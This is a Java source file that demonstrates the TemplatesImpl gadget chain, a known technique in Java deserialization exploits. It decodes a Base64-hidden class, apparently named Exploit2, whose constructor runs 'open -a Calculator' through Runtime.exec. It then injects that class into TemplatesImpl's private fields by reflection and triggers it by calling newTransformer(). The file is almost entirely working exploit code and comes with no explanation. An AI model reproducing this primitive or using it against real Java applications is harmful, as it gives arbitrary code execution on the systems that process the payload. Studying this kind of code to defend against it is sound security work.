import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Base64;

public class TemplatesImplDemo {

    private static void setFiledValue(Object obj, String fieldName, Object fieldValue) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, fieldValue);
    }

    public static void main(String[] args) {
        try {
            byte[] codes = Base64.getDecoder().decode("yv66vgAAADQAJwoACAAXCgAYABkIABoKABgAGwcAHAoABQAdBwAeBwAfAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEADVN0YWNrTWFwVGFibGUHAB4HABwBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAApFeGNlcHRpb25zBwAgAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEAClNvdXJjZUZpbGUBAA1FeHBsb2l0Mi5qYXZhDAAJAAoHACEMACIAIwEAEm9wZW4gLWEgQ2FsY3VsYXRvcgwAJAAlAQATamF2YS9sYW5nL0V4Y2VwdGlvbgwAJgAKAQAIRXhwbG9pdDIBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAwABAAkACgABAAsAAABgAAIAAgAAABYqtwABuAACEgO2AARXpwAITCu2AAaxAAEABAANABAABQACAAwAAAAaAAYAAAAIAAQACwANABEAEAAPABEAEAAVABIADQAAABAAAv8AEAABBwAOAAEHAA8EAAEAEAARAAIACwAAABkAAAADAAAAAbEAAAABAAwAAAAGAAEAAAAYABIAAAAEAAEAEwABABAAFAACAAsAAAAZAAAABAAAAAGxAAAAAQAMAAAABgABAAAAHQASAAAABAABABMAAQAVAAAAAgAW");

            byte[][] _bytecodes = new byte[][] {
                    codes,
            };

            TemplatesImpl templates = new TemplatesImpl();
            setFiledValue(templates, "_bytecodes", _bytecodes);
            setFiledValue(templates, "_name", "whatever");
            setFiledValue(templates, "_tfactory", new TransformerFactoryImpl());
            templates.newTransformer();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
